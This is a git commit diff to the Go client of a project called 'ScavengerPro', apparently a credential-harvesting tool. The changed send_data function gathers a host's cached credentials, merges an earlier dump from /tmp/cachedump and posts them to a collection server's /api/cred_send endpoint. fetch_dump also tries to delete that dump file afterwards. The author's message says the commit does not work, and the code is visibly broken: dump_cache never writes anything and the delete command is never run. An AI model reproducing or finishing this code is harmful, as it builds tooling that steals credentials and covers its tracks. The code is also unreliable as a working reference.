3a6f3d557affe045325d6ff905903959ee251f5b
Jim Maskelony <degenerat3@github.com>
2019-01-25 13:03:24 -0500

    ignore this commit, shit doesn't work but I gotta go do somethin

--- client/shipper.go
+++ client/shipper.go
@@ -10,19 +10,30 @@ import(
 	"encoding/json"
 	"ScavengerPro/client/cred_cache"
 	"os"
-	"io"
+	"os/exec"
 	"bufio"
 )
 
 var serv = "127.0.0.1:5000" 	//IP of server
 
 func send_data(c cred_cache.CredCache){
+	path := "/tmp/cachedump"
 	h := c.Get_hostname()
 	creds := c.Get_entries()
+	previous_dump := fetch_dump(path)
+	if previous_dump !=nil{
+		for _,c := range previous_dump{
+			creds = append(creds, c)
+		}
+	}
+	cred_str := ""
+	for _,cd := range creds{
+		cred_str += cd + "\n"
+	}
 	fmt.Printf("%s\n", h)
 	fmt.Printf("%s\n", creds)
 	url := "http://" + serv + "/api/cred_send"	//turn ip into URL
-	jsonData := map[string]string{"hostname": h, "credentials": creds}
+	jsonData := map[string]string{"hostname": h, "credentials": cred_str}
 	jsonValue, _ := json.Marshal(jsonData)
 	_, err := http.Post(url, "application/json", bytes.NewBuffer(jsonValue))
 	if err != nil{
@@ -36,15 +47,18 @@ func send_data(c cred_cache.CredCache){
 
 func dump_cache(creds []string, path string){
 	_, err := os.Stat(path)
-	if os.IsNotExist(err){
-		var f, _ = os.Create(path)
-		defer file.Close()
-	} else{
-		var f, _ = os.openFile(path, os.O_APPEND|os.O_WRONLY, 0600)
-	}
+	var f *os.File
+	cstr := ""
 	for _, cred := range creds {
-		fmt.Fprintln(f, cred)
+		cstr += cred + "\n"
 	}
+	if os.IsNotExist(err){
+		f, _ = os.Create(path)
+		defer f.Close()
+	} else{
+		f, _ = os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0600)
+	}
+
 	return
 }
 
@@ -59,6 +73,8 @@ func fetch_dump(path string) []string{
 	for scanner.Scan(){
 		data = append(data, scanner.Text())
 	}
+	com := "rm " + path
+	exec.Command(com)
 	return data
 }
 
@@ -74,7 +90,7 @@ func ship_it(c cred_cache.CredCache, min int){
 func main(){
 	c := cred_cache.CredCache {
 		Hostname: "malBox",
-		Credentials: []string{"root:hunter2","jim:letmein"},
+		Credentials: []string{"jim:letmein","dragon:nomnom"},
 	}
 	send_data(c)
 }
